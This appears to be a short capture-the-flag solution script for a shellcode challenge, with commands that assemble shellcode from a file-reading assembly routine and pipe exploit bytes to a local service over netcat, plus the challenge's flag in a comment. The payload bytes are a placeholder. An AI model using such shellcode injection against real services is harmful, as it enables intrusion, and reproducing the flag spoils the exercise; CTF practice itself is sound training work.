# create the shellcode in binary form and inject into nc 0 9026
# flag: Mak1ng_shelLcodE_i5_veRy_eaSy
python3.6 ../../shellcode/shellcode.py assembly/read_write_file.s > exploit_str
cat exploit_str | cs
python2 -c "print 'REPLACE THIS WITH THE EXPLOIT BYTES'" | nc 0 9026
